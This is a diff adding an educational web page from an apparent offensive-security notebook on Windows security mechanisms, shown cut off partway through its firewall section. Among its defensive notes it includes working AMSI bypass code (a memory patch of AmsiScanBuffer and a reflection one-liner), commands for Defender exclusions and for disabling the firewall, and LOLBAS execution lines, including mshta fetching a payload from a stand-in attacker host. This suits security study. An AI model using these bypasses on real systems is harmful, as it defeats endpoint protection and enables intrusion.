@@ -1,0 +1,1783 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | OS Security Mechanisms</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-powershell.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+  <div class="content">
+  <h1>Windows OS Security Mechanisms</h1>
+
+  <!-- Tab Navigation -->
+  <ul class="nav nav-tabs" id="mainTabs" role="tablist">
+    <li class="nav-item" role="presentation">
+      <button class="nav-link active" id="notes-tab" data-bs-toggle="tab" data-bs-target="#notes" type="button" role="tab">Notes</button>
+    </li>
+    <li class="nav-item" role="presentation">
+      <button class="nav-link" id="lab-tab" data-bs-toggle="tab" data-bs-target="#lab" type="button" role="tab">Labs</button>
+    </li>
+    <li class="nav-item" role="presentation">
+      <button class="nav-link" id="ctf-tab" data-bs-toggle="tab" data-bs-target="#ctf" type="button" role="tab">CTF Challenges</button>
+    </li>
+  </ul>
+
+  <div class="tab-content" id="mainTabContent">
+
+    <!-- ═══════════════════════════════════════════════════════════════════
+         NOTES TAB
+         ═══════════════════════════════════════════════════════════════════ -->
+    <div class="tab-pane fade show active" id="notes" role="tabpanel">
+
+      <!-- ─────────────────────────────────────────────────────────────────
+           SECTION 1: WINDOWS DEFENDER / MICROSOFT DEFENDER
+           ───────────────────────────────────────────────────────────────── -->
+      <h2>1. Windows Defender / Microsoft Defender</h2>
+
+      <h3>1.1 Components</h3>
+      <table class="table table-bordered table-dark">
+        <thead><tr><th>Component</th><th>Function</th><th>Process/Service</th></tr></thead>
+        <tbody>
+          <tr><td>Microsoft Defender Antivirus</td><td>Real-time protection, cloud-delivered protection, on-demand scanning</td><td><code>MsMpEng.exe</code> (Antimalware Service Executable)</td></tr>
+          <tr><td>Microsoft Defender for Endpoint (MDE)</td><td>EDR — behavioral sensors, threat analytics, automated investigation</td><td><code>MsSense.exe</code></td></tr>
+          <tr><td>Attack Surface Reduction (ASR) Rules</td><td>Block specific attack techniques (Office macros, script obfuscation, credential stealing)</td><td>Enforced via WMI/GPO/Intune</td></tr>
+          <tr><td>Network Protection</td><td>Blocks connections to malicious domains/IPs</td><td>Part of MDE platform</td></tr>
+          <tr><td>Controlled Folder Access</td><td>Ransomware protection — blocks unauthorized writes to protected folders</td><td>Defender AV engine</td></tr>
+          <tr><td>Exploit Protection</td><td>DEP, ASLR, CFG, SEHOP enforcement per-process</td><td>Kernel + user-mode mitigation</td></tr>
+        </tbody>
+      </table>
+
+      <h3>1.2 Detection Methods</h3>
+      <table class="table table-bordered table-dark">
+        <thead><tr><th>Method</th><th>Description</th><th>Evasion Difficulty</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Signature-based</strong></td><td>Matches known malware hashes/byte patterns from definition updates</td><td>Low — obfuscation, packing, polymorphism</td></tr>
+          <tr><td><strong>Heuristic</strong></td><td>Static analysis of code structure, suspicious API imports, packer detection</td><td>Medium — requires structural changes</td></tr>
+          <tr><td><strong>Behavioral</strong></td><td>Monitors runtime behavior — process injection, credential access, persistence mechanisms</td><td>High — must change attack methodology</td></tr>
+          <tr><td><strong>Machine Learning</strong></td><td>Cloud-based ML models analyze file features (entropy, imports, sections, strings)</td><td>High — adversarial ML techniques</td></tr>
+          <tr><td><strong>AMSI</strong></td><td>Scans script content at runtime before execution (PowerShell, VBScript, JScript, .NET)</td><td>Medium — memory patching, obfuscation</td></tr>
+        </tbody>
+      </table>
+
+      <h3>1.3 AMSI (Antimalware Scan Interface)</h3>
+      <h4>Architecture</h4>
+      <p>AMSI is a COM-based interface that allows applications to request content scanning from registered AV providers. The scan flow:</p>
+      <ol>
+        <li>Application (e.g., PowerShell) calls <code>AmsiScanBuffer()</code> or <code>AmsiScanString()</code></li>
+        <li>AMSI DLL (<code>amsi.dll</code>) loaded into the process forwards the buffer</li>
+        <li>Registered AMSI provider (e.g., Defender) evaluates the content</li>
+        <li>Returns <code>AMSI_RESULT</code>: Clean, NotDetected, BlockedByAdmin, or Detected (1–32767 severity)</li>
+      </ol>
+      <p><strong>Key AMSI providers:</strong> Microsoft Defender AV, third-party AVs, custom providers via <code>IAntimalwareProvider</code> COM interface.</p>
+      <p><strong>AMSI-aware applications:</strong> PowerShell (v5+), VBScript, JScript, .NET (4.8+), Office VBA macros, Windows Script Host, JavaScript via wscript/cscript.</p>
+
+      <h4>AMSI Bypass Techniques</h4>
+
+      <h5>1. Memory Patching AmsiScanBuffer</h5>
+      <p>Patch the <code>AmsiScanBuffer</code> function in memory to always return <code>AMSI_RESULT_CLEAN</code>. The function prologue is overwritten with a <code>ret</code> instruction or forced to return 0x80070057 (E_INVALIDARG).</p>
+<pre><code class="language-powershell"># Classic AmsiScanBuffer patch (educational — signatures exist for this)
+$win32 = @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $win32
+$amsiDll = [Win32]::LoadLibrary("amsi.dll")
+$amsiScanBuffer = [Win32]::GetProcAddress($amsiDll, "AmsiScanBuffer")
+$p = 0
+[Win32]::VirtualProtect($amsiScanBuffer, [uint32]5, 0x40, [ref]$p)
+$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)  # mov eax, 0x80070057; ret
+[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $amsiScanBuffer, 6)
+</code></pre>
+
+      <h5>2. Reflection-based Bypass</h5>
+      <p>Use .NET reflection to access internal AMSI fields and set <code>amsiInitFailed</code> to <code>true</code>:</p>
+<pre><code class="language-powershell"># Force amsiInitFailed via reflection
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+</code></pre>
+
+      <h5>3. Obfuscation / String Manipulation</h5>
+<pre><code class="language-powershell"># Break known signatures with concatenation, encoding, variable substitution
+$a = 'Am'; $b = 'si'; $c = 'Utils'
+$d = [Ref].Assembly.GetType("System.Management.Automation.$a$b$c")
+# ... continue with field access
+</code></pre>
+
+      <h5>4. COM Server Hijacking</h5>
+      <p>Register a custom COM server that implements <code>IAntimalwareProvider</code> and always returns clean. Modify registry:</p>
+<pre><code class="language-powershell"># Hijack AMSI COM registration (requires admin)
+# CLSID for AMSI provider: {2781761E-28E0-4109-99FE-B9D127C57AFE} (Defender)
+# Replace InProcServer32 with custom DLL that returns AMSI_RESULT_CLEAN
+New-Item -Path "HKLM:\SOFTWARE\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32" -Value "C:\temp\fake_amsi.dll" -Force
+</code></pre>
+
+      <h5>5. Unhooking amsi.dll</h5>
+      <p>Load a fresh copy of <code>amsi.dll</code> from disk and overwrite the .text section in memory, removing any hooks:</p>
+<pre><code class="language-powershell"># Load clean amsi.dll from disk and remap .text section
+$amsiModule = [System.Diagnostics.Process]::GetCurrentProcess().Modules | Where-Object { $_.ModuleName -eq "amsi.dll" }
+$cleanBytes = [System.IO.File]::ReadAllBytes("C:\Windows\System32\amsi.dll")
+# Parse PE, find .text section, overwrite in-memory copy
+</code></pre>
+
+      <h3>1.4 Defender Exclusions (Commonly Abused)</h3>
+<pre><code class="language-powershell"># Query current exclusions
+Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
+Get-MpPreference | Select-Object -ExpandProperty ExclusionExtension
+Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess
+
+# Add exclusion (requires admin)
+Add-MpPreference -ExclusionPath "C:\Tools"
+Add-MpPreference -ExclusionProcess "payload.exe"
+Add-MpPreference -ExclusionExtension ".hta"
+
+# Common abused exclusion paths in enterprise:
+# C:\ProgramData\  (software deployment)
+# C:\Windows\Temp\ (SCCM packages)
+# C:\Admin\        (admin tools)
+</code></pre>
+
+      <h3>1.5 Tamper Protection</h3>
+      <p>Tamper Protection prevents unauthorized changes to Defender settings. When enabled:</p>
+      <ul>
+        <li>Cannot disable real-time protection via registry/GPO/PowerShell</li>
+        <li>Cannot modify exclusions without proper authorization</li>
+        <li>Cannot stop/disable the Defender service</li>
+        <li>Cannot uninstall Defender components</li>
+        <li>Managed via Microsoft 365 Defender portal (cloud-managed)</li>
+      </ul>
+<pre><code class="language-powershell"># Check Tamper Protection status
+Get-MpComputerStatus | Select-Object IsTamperProtected
+
+# These commands FAIL when Tamper Protection is ON:
+Set-MpPreference -DisableRealtimeMonitoring $true  # Blocked
+sc stop WinDefend                                    # Blocked
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1  # Blocked
+</code></pre>
+
+      <!-- ─────────────────────────────────────────────────────────────────
+           SECTION 2: APPLOCKER
+           ───────────────────────────────────────────────────────────────── -->
+      <h2>2. AppLocker</h2>
+
+      <h3>2.1 Rule Types</h3>
+      <table class="table table-bordered table-dark">
+        <thead><tr><th>Collection</th><th>Extensions</th><th>Description</th></tr></thead>
+        <tbody>
+          <tr><td>Executable Rules</td><td>.exe, .com</td><td>Controls which executables can run</td></tr>
+          <tr><td>Windows Installer Rules</td><td>.msi, .msp, .mst</td><td>Controls installer packages</td></tr>
+          <tr><td>Script Rules</td><td>.ps1, .bat, .cmd, .vbs, .js</td><td>Controls script execution</td></tr>
+          <tr><td>Packaged App Rules</td><td>.appx</td><td>Controls Universal Windows Platform apps</td></tr>
+          <tr><td>DLL Rules</td><td>.dll, .ocx</td><td>Controls which DLLs can be loaded (off by default — performance impact)</td></tr>
+        </tbody>
+      </table>
+
+      <h3>2.2 Rule Conditions</h3>
+      <table class="table table-bordered table-dark">
+        <thead><tr><th>Condition</th><th>What It Checks</th><th>Strength</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Publisher</strong></td><td>Digital signature: Publisher name, product name, file name, file version (supports wildcards)</td><td>Strongest — survives updates</td></tr>
+          <tr><td><strong>Path</strong></td><td>File system location (folder or specific file path)</td><td>Moderate — bypassed if attacker can write to allowed path</td></tr>
+          <tr><td><strong>File Hash</strong></td><td>SHA256 Authenticode hash of the file</td><td>Brittle — breaks on every update</td></tr>
+        </tbody>
+      </table>
+
+      <h3>2.3 Default Rules &amp; Enforcement Modes</h3>
+<pre><code class="language-powershell"># Check AppLocker policy
+Get-AppLockerPolicy -Effective | Format-List
+
+# Get specific rule collections
+Get-AppLockerPolicy -Effective -Xml
+
+# Enforcement modes:
+# - NotConfigured: rules not applied
+# - AuditOnly: log violations in Event Viewer (Applications and Services > Microsoft > Windows > AppLocker)
+# - Enabled: enforce rules (block violations)
+
+# Default rules (auto-created):
+# 1. Allow Everyone: %WINDIR%\* (Windows directory)
+# 2. Allow Everyone: %PROGRAMFILES%\* (Program Files)
+# 3. Allow BUILTIN\Administrators: * (all files)
+</code></pre>
+
+      <h3>2.4 AppLocker Bypass Techniques</h3>
+
+      <h4>Trusted Folder Abuse</h4>
+      <p>If path rules allow <code>C:\Windows\*</code>, find writable subdirectories:</p>
+<pre><code class="language-powershell"># Find world-writable directories under allowed paths
+$paths = @("C:\Windows\Tasks", "C:\Windows\Temp", "C:\Windows\tracing",
+           "C:\Windows\Registration\CRMLog", "C:\Windows\System32\FxsTmp",
+           "C:\Windows\System32\com\dmp", "C:\Windows\System32\spool\drivers\color",
+           "C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys")
+
+foreach ($p in $paths) {
+    if (Test-Path $p) {
+        $acl = Get-Acl $p
+        Write-Output "$p - $($acl.Access | Where-Object { $_.IdentityReference -match 'Users|Everyone' } | Select-Object -First 1)"
+    }
+}
+</code></pre>
+
+      <h4>LOLBAS (Living Off the Land Binaries and Scripts)</h4>
+      <p>Microsoft-signed binaries that can execute arbitrary code:</p>
+      <table class="table table-bordered table-dark">
+        <thead><tr><th>Binary</th><th>Technique</th><th>Example</th></tr></thead>
+        <tbody>
+          <tr><td><code>MSBuild.exe</code></td><td>Compiles and executes inline C# from .csproj/.xml</td><td><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml</code></td></tr>
+          <tr><td><code>InstallUtil.exe</code></td><td>Executes code in [RunInstaller] decorated class</td><td><code>InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll</code></td></tr>
+          <tr><td><code>RegSvcs.exe</code></td><td>Loads .NET assembly via COM registration</td><td><code>RegSvcs.exe payload.dll</code></td></tr>
+          <tr><td><code>RegAsm.exe</code></td><td>Similar to RegSvcs, COM registration</td><td><code>RegAsm.exe /U payload.dll</code></td></tr>
+          <tr><td><code>rundll32.exe</code></td><td>Loads arbitrary DLL and calls export function</td><td><code>rundll32.exe payload.dll,EntryPoint</code></td></tr>
+          <tr><td><code>mshta.exe</code></td><td>Executes HTA files with embedded scripts</td><td><code>mshta.exe http://attacker/payload.hta</code></td></tr>
+          <tr><td><code>cscript/wscript</code></td><td>Windows Script Host execution</td><td><code>cscript.exe //E:jscript payload.txt</code></td></tr>
+          <tr><td><code>CMSTP.exe</code></td><td>Installs Connection Manager profiles (UAC bypass + AppLocker bypass)</td><td><code>cmstp.exe /ni /s payload.inf</code></td></tr>
+          <tr><td><code>Bash.exe</code></td><td>WSL binary — executes Linux binaries</td><td><code>bash.exe -c "whoami"</code></td></tr>
+        </tbody>
+      </table>
+
+      <h4>Alternate Data Streams</h4>
+<pre><code class="language-powershell"># Hide payload in ADS of allowed file
+type payload.exe > "C:\Windows\Tasks\legit.txt:payload.exe"
+wmic process call create "C:\Windows\Tasks\legit.txt:payload.exe"
+
+# Or use makecab + extrac32 (another LOLBAS)
+extrac32 /Y /C C:\Users\Public\payload.cab C:\Windows\Temp\payload.exe
+</code></pre>
+
+      <h4>DLL-based Bypass</h4>
+      <p>If DLL rules are NOT enabled (default), any DLL can be loaded regardless of AppLocker policy:</p>
+<pre><code class="language-powershell"># Load malicious DLL via rundll32 (DLL rules off = no restriction)
+rundll32.exe C:\Users\Public\malicious.dll,DllMain
+
+# Or use PowerShell to load assembly
+[System.Reflection.Assembly]::LoadFile("C:\Users\Public\payload.dll")
+</code></pre>
+
+      <!-- ─────────────────────────────────────────────────────────────────
+           SECTION 3: WDAC (Windows Defender Application Control)
+           ───────────────────────────────────────────────────────────────── -->
+      <h2>3. WDAC (Windows Defender Application Control)</h2>
+
+      <h3>3.1 WDAC vs AppLocker</h3>
+      <table class="table table-bordered table-dark">
+        <thead><tr><th>Feature</th><th>AppLocker</th><th>WDAC</th></tr></thead>
+        <tbody>
+          <tr><td>Enforcement Level</td><td>User-mode (AppIDSvc service)</td><td>Kernel-mode (Code Integrity)</td></tr>
+          <tr><td>Bypass Difficulty</td><td>Many known bypasses</td><td>Significantly harder</td></tr>
+          <tr><td>Admin Bypass</td><td>Default admin rule allows everything</td><td>No implicit admin bypass</td></tr>
+          <tr><td>Kernel Drivers</td><td>Cannot control</td><td>Controls driver loading</td></tr>
+          <tr><td>Management</td><td>GPO only</td><td>GPO, MDM, MEMCM, Intune</td></tr>
+          <tr><td>Recommended For</td><td>Legacy / audit-only scenarios</td><td>Modern enterprise enforcement</td></tr>
+          <tr><td>Performance</td><td>Minimal</td><td>Slightly higher (kernel checks)</td></tr>
+        </tbody>
+      </table>
+
+      <h3>3.2 Policy Creation</h3>
+<pre><code class="language-powershell"># Create a base policy from a reference system (gold image)
+New-CIPolicy -Level Publisher -FilePath "C:\Policies\BasePolicy.xml" -UserPEs -Fallback Hash
+
+# Trust levels (from most to least specific):
+# Hash → FileName → FilePublisher → LeafCertificate → PcaCertificate → Publisher
+
+# Create policy allowing all Microsoft-signed binaries
+New-CIPolicy -Level Publisher -FilePath "C:\Policies\MicrosoftOnly.xml" -UserPEs
+
+# Merge supplemental policy
+Merge-CIPolicy -PolicyPaths "C:\Policies\BasePolicy.xml","C:\Policies\Supplemental.xml" -OutputFilePath "C:\Policies\Merged.xml"
+
+# Convert XML to binary (.p7b) for deployment
+ConvertFrom-CIPolicy "C:\Policies\BasePolicy.xml" "C:\Windows\System32\CodeIntegrity\SIPolicy.p7b"
+
+# Set policy to audit mode first
+Set-RuleOption -FilePath "C:\Policies\BasePolicy.xml" -Option 3  # Audit Mode
+
+# Remove audit mode (enforce)
+Set-RuleOption -FilePath "C:\Policies\BasePolicy.xml" -Option 3 -Delete
+</code></pre>
+
+      <h3>3.3 Trust Levels Hierarchy</h3>
+      <ol>
+        <li><strong>Hash</strong> — Exact file hash (most restrictive, breaks on updates)</li>
+        <li><strong>FileName</strong> — Original filename from PE header + minimum version</li>
+        <li><strong>FilePublisher</strong> — Publisher + product + filename + version</li>
+        <li><strong>LeafCertificate</strong> — Specific signing certificate</li>
+        <li><strong>PcaCertificate</strong> — Certificate Authority that issued the signing cert</li>
+        <li><strong>Publisher</strong> — Any binary signed by a given publisher</li>
+      </ol>
+
+      <h3>3.4 Managed Installer</h3>
+      <p>Managed Installer allows WDAC to trust binaries deployed by authorized software distribution systems (SCCM/MEMCM, Intune). Anything installed by the managed installer is automatically trusted.</p>
+<pre><code class="language-powershell"># Configure managed installer (SCCM example)
+# The AppLocker policy must tag ccmexec.exe as a managed installer
+# Then WDAC will trust anything it deploys
+
+# Check managed installer status
+Get-CIPolicy -FilePath "C:\Windows\System32\CodeIntegrity\SIPolicy.p7b" | Select-Object -ExpandProperty Rules
+</code></pre>
+
+      <h3>3.5 WDAC Bypass Techniques</h3>
+      <ul>
+        <li><strong>LOLBins in default policy:</strong> Some Microsoft-signed binaries can execute arbitrary code and may be allowed by default WDAC policies (MSBuild, PowerShell in constrained language mode bypass)</li>
+        <li><strong>Unsigned catalog abuse:</strong> If catalog signing is trusted, inject into unsigned catalog</li>
+        <li><strong>WDAC policy tampering:</strong> In audit mode, nothing is blocked — attackers may attempt to switch policy to audit</li>
+        <li><strong>Managed installer abuse:</strong> Compromise the software distribution system to deploy malicious payloads as "managed"</li>
+        <li><strong>Vulnerable driver loading:</strong> Bring Your Own Vulnerable Driver (BYOVD) — load a signed but vulnerable driver to disable WDAC from kernel</li>
+      </ul>
+
+      <!-- ─────────────────────────────────────────────────────────────────
+           SECTION 4: BITLOCKER & TPM
+           ───────────────────────────────────────────────────────────────── -->
+      <h2>4. BitLocker &amp; TPM</h2>
+
+      <h3>4.1 BitLocker Encryption Modes</h3>
+      <table class="table table-bordered table-dark">
+        <thead><tr><th>Mode</th><th>Authentication</th><th>Security Level</th><th>Use Case</th></tr></thead>
+        <tbody>
+          <tr><td>TPM Only</td><td>Transparent — automatic unlock at boot</td><td>Low — vulnerable to offline attacks</td><td>Default laptop encryption</td></tr>
+          <tr><td>TPM + PIN</td><td>Pre-boot PIN required</td><td>High — protects against offline + DMA</td><td>High-security workstations</td></tr>
+          <tr><td>TPM + USB Startup Key</td><td>USB key must be present at boot</td><td>Medium-High</td><td>Servers without keyboard</td></tr>
+          <tr><td>TPM + PIN + USB</td><td>Both PIN and USB key</td><td>Highest</td><td>Maximum security requirement</td></tr>
+          <tr><td>Password Only (no TPM)</td><td>Full password at boot</td><td>Medium — depends on password strength</td><td>VMs / systems without TPM</td></tr>
+        </tbody>
+      </table>
+
+<pre><code class="language-powershell"># Check BitLocker status
+manage-bde -status C:
+Get-BitLockerVolume -MountPoint C:
+
+# Enable BitLocker with TPM+PIN
+Enable-BitLocker -MountPoint "C:" -EncryptionMethod XtsAes256 -TpmAndPinProtector -Pin (ConvertTo-SecureString "123456" -AsPlainText -Force)
+
+# Enable BitLocker TPM-only
+Enable-BitLocker -MountPoint "C:" -EncryptionMethod XtsAes256 -TpmProtector
+
+# Backup recovery key to AD
+Backup-BitLockerKeyProtector -MountPoint "C:" -KeyProtectorId $keyProtectorId
+</code></pre>
+
+      <h3>4.2 TPM (Trusted Platform Module)</h3>
+      <h4>Platform Configuration Registers (PCRs)</h4>
+      <table class="table table-bordered table-dark">
+        <thead><tr><th>PCR</th><th>Measures</th></tr></thead>
+        <tbody>
+          <tr><td>0</td><td>BIOS/UEFI firmware code</td></tr>
+          <tr><td>1</td><td>BIOS/UEFI firmware configuration</td></tr>
+          <tr><td>2</td><td>Option ROMs</td></tr>
+          <tr><td>3</td><td>Option ROM configuration</td></tr>
+          <tr><td>4</td><td>MBR / boot manager code</td></tr>
+          <tr><td>5</td><td>MBR / boot manager configuration</td></tr>
+          <tr><td>6</td><td>State transitions / wake events</td></tr>
+          <tr><td>7</td><td>Secure Boot state (UEFI variables, certificates)</td></tr>
+          <tr><td>8-10</td><td>OS-specific (kernel, drivers)</td></tr>
+          <tr><td>11</td><td>BitLocker access control</td></tr>
+          <tr><td>12-15</td><td>Available for OS/applications</td></tr>
+        </tbody>
+      </table>
+
+      <h4>Sealing &amp; Unsealing</h4>
+      <ul>
+        <li><strong>Sealing:</strong> TPM encrypts data bound to specific PCR values — data can only be decrypted when system is in the same measured state</li>
+        <li><strong>Unsealing:</strong> TPM releases the sealed key only if current PCR values match the sealed state</li>
+        <li>BitLocker seals the Volume Master Key (VMK) to PCRs 0, 2, 4, 7, 11</li>
+      </ul>
+
+      <h3>4.3 BitLocker Attack Surface</h3>
+
+      <h4>Recovery Key Attacks</h4>
+<pre><code class="language-powershell"># Recovery keys stored in:
+# - Active Directory (AD DS): stored as attribute on computer object
+# - Azure AD / Entra ID: accessible via portal
+# - File: saved to USB/network share during setup
+# - Printed: physical copy
+
+# Query AD for recovery keys (requires appropriate permissions)
+Get-ADObject -Filter {objectclass -eq 'msFVE-RecoveryInformation'} -SearchBase "CN=WORKSTATION01,OU=Computers,DC=corp,DC=local" -Properties msFVE-RecoveryPassword
+</code></pre>
+
+      <h4>DMA Attacks</h4>
+      <p>Direct Memory Access attacks via Thunderbolt/PCIe can read encryption keys from RAM if TPM-only mode is used (no PIN):</p>
+      <ul>
+        <li><strong>PCILeech:</strong> FPGA-based DMA attack tool — reads physical memory via Thunderbolt/PCIe</li>
+        <li><strong>Inception:</strong> DMA-based attack tool for key extraction</li>
+        <li>Mitigation: Enable TPM+PIN, enable Kernel DMA Protection (VBS-based), disable Thunderbolt in BIOS</li>
+      </ul>
+
+      <h4>Cold Boot Attack</h4>
+      <p>RAM retains data briefly after power loss (DRAM remanence). Spray canned air to cool RAM chips, then:</p>
+      <ol>
+        <li>Force reboot into custom OS (or transplant RAM to another machine)</li>
+        <li>Dump physical memory before encryption keys decay</li>
+        <li>Extract AES keys from the memory dump</li>
+      </ol>
+
+      <h4>TPM Bus Sniffing</h4>
+      <p>For discrete TPM chips (not fTPM), the communication between TPM and CPU travels over an SPI or LPC bus. An attacker with physical access can:</p>
+      <ol>
+        <li>Attach logic analyzer probes to TPM SPI/LPC bus pins</li>
+        <li>Trigger a normal boot (TPM-only mode)</li>
+        <li>Capture the VMK as it's transmitted from TPM to CPU</li>
+        <li>Use captured VMK to decrypt the drive offline</li>
+      </ol>
+      <p><strong>Tools:</strong> Saleae Logic, PicoScope + custom scripts, dedicated TPM sniffing hardware.</p>
+      <p><strong>Mitigation:</strong> Use TPM+PIN (VMK is sealed to PIN hash — sniffed key alone is insufficient), use fTPM (firmware TPM integrated into CPU — no external bus).</p>
+
+      <h3>4.4 Group Policy BitLocker Settings</h3>
+<pre><code class="language-powershell"># Key GPO paths: Computer Configuration > Administrative Templates > Windows Components > BitLocker Drive Encryption
+# Key settings:
+# - Require additional authentication at startup (TPM+PIN enforcement)
+# - Choose drive encryption method and cipher strength (XTS-AES 256)
+# - Store BitLocker recovery information in AD DS
+# - Deny write access to removable drives not protected by BitLocker
+# - Configure use of hardware-based encryption
+
+# Registry checks:
+reg query "HKLM\SOFTWARE\Policies\Microsoft\FVE"
+# FVEKeyPackage, UseTPM, UseTPMPIN, EncryptionMethod, etc.
+</code></pre>
+
+      <!-- ─────────────────────────────────────────────────────────────────
+           SECTION 5: WINDOWS FIREWALL WITH ADVANCED SECURITY
+           ───────────────────────────────────────────────────────────────── -->
+      <h2>5. Windows Firewall with Advanced Security</h2>
+
+      <h3>5.1 Rule Types</h3>
+      <table class="table table-bordered table-dark">
+        <thead><tr><th>Rule Type</th><th>Purpose</th><th>Direction</th></tr></thead>
+        <tbody>
+          <tr><td>Inbound Rules</td><td>Control incoming connections to this machine</td><td>External → Local</td></tr>
+          <tr><td>Outbound Rules</td><td>Control connections initiated by this machine</td><td>Local → External</td></tr>
+          <tr><td>Connection Security Rules</td><td>IPSec authentication/encryption between peers</td><td>Bidirectional</td></tr>
+        </tbody>
+      </table>
+
+      <h3>5.2 Rule Processing Order</h3>
+      <ol>
+        <li><strong>Windows Service Hardening (WSH)</strong> — Restricts services to expected behavior (highest priority)</li>
+        <li><strong>Connection Security Rules</strong> — Authenticated bypass ("Allow if secure")</li>
+        <li><strong>Block Rules</strong> — Explicitly blocked traffic</li>
+        <li><strong>Allow Rules</strong> — Explicitly allowed traffic</li>
+        <li><strong>Default Profile Behavior</strong> — Block inbound (default) / Allow outbound (default)</li>
+      </ol>
+
+      <h3>5.3 Profile Types</h3>
+      <table class="table table-bordered table-dark">
+        <thead><tr><th>Profile</th><th>Activated When</th><th>Default Behavior</th></tr></thead>
+        <tbody>
+          <tr><td>Domain</td><td>Connected to domain network (DC reachable)</td><td>Most permissive (corporate LAN)</td></tr>
+          <tr><td>Private</td><td>User marks network as private (home/work)</td><td>Moderate</td></tr>
+          <tr><td>Public</td><td>Default for unknown networks (hotel, coffee shop)</td><td>Most restrictive</td></tr>
+        </tbody>
+      </table>
+
+      <h3>5.4 Management Commands</h3>
+<pre><code class="language-powershell"># ─── netsh advfirewall ───
+# Show all profiles status
+netsh advfirewall show allprofiles
+
+# Disable/enable firewall
+netsh advfirewall set allprofiles state off
+netsh advfirewall set allprofiles state on
+
+# Add inbound allow rule
+netsh advfirewall firewall add rule name="Allow SSH" dir=in action=allow protocol=tcp localport=22
+
+# Add outbound block rule
+netsh advfirewall firewall add rule name="Block Telnet Out" dir=out action=block protocol=tcp remoteport=23
+
+# Delete a rule
+netsh advfirewall firewall delete rule name="Allow SSH"
+
+# Export/import firewall policy
+netsh advfirewall export "C:\backup\firewall.wfw"
+netsh advfirewall import "C:\backup\firewall.wfw"
+</code></pre>
+
+<pre><code class="language-powershell"># ─── PowerShell cmdlets ───
+# List all firewall rules
+Get-NetFirewallRule | Select-Object Name, DisplayName, Direction, Action, Enabled | Format-Table
+
+# Create inbound allow rule
+New-NetFirewallRule -DisplayName "Allow HTTP" -Direction Inbound -Protocol TCP -LocalPort 80 -Action Allow -Profile Domain,Private
+
+# Create outbound block rule
+New-NetFirewallRule -DisplayName "Block IRC" -Direction Outbound -Protocol TCP -RemotePort 6667 -Action Block
+
+# Get rules for specific program
+Get-NetFirewallApplicationFilter | Where-Object { $_.Program -like "*chrome*" } | Get-NetFirewallRule
+
+# Disable a rule
+Disable-NetFirewallRule -DisplayName "Allow HTTP"
+
+# Get firewall profile settings
+Get-NetFirewallProfile | Select-Object Name, Enabled, DefaultInboundAction, DefaultOutboundAction
+</code></pre>
+
+      <h3>5.5 WFP (Windows Filtering Platform) Architecture</h3>
+      <p>WFP is the underlying framework that Windows Firewall builds upon. It operates at multiple layers:</p>
+      <ul>
+        <li><strong>Application Layer Enforcement (ALE):</strong> Controls connection setup (bind, connect, listen, accept)</li>
+        <li><strong>Transport Layer:</strong> Filters TCP/UDP packets</li>
+        <li><strong>Network Layer:</strong> IP-level filtering</li>
+        <li><strong>FWPM (Filter Platform Management):</strong> User-mode API for managing filters</li>
+        <li><strong>Callout Drivers:</strong> Kernel-mode modules for deep packet inspection (used by EDR, AV)</li>
+      </ul>
+<pre><code class="language-powershell"># View WFP filters (requires admin)
+netsh wfp show filters
+
+# Capture WFP state for diagnostics
+netsh wfp capture start
+# ... reproduce issue ...
+netsh wfp capture stop
+
+# View WFP state
+netsh wfp show state
+</code></pre>
+
+      <h3>5.6 Firewall Bypass Techniques</h3>
+      <ul>
+        <li><strong>Allowed program abuse:</strong> Inject shellcode into a process that has firewall exceptions (e.g., svchost.exe, explorer.exe)</li>
+        <li><strong>Port reuse:</strong> Bind to an already-open port (e.g., 80, 443) using SO_REUSEADDR — traffic piggybacks on allowed rules</li>
+        <li><strong>DNS/HTTPS tunneling:</strong> Exfiltrate data over DNS (port 53) or HTTPS (port 443) — typically always allowed outbound</li>
